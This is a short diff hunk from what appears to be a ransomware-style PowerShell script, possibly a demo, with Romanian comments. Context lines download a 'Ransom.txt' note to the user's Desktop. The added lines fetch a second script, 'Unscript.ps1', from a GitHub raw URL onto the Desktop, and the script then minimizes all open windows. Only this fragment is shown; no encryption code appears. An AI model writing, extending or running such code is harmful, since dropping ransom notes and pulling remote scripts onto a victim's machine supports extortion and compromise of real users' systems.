@@ -47,6 +47,12 @@ $output = "$env:USERPROFILE\Desktop\Ransom.txt"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $output)
 
+# Descarca fisierul Unscript.ps1
+$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Unscript.ps1"
+$output = "$env:USERPROFILE\Desktop\Unscript.ps1"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $output)
+
 # Minimizeaza toate aplicatiile care ruleaza
 $shell = New-Object -ComObject Shell.Application
 $shell.MinimizeAll()
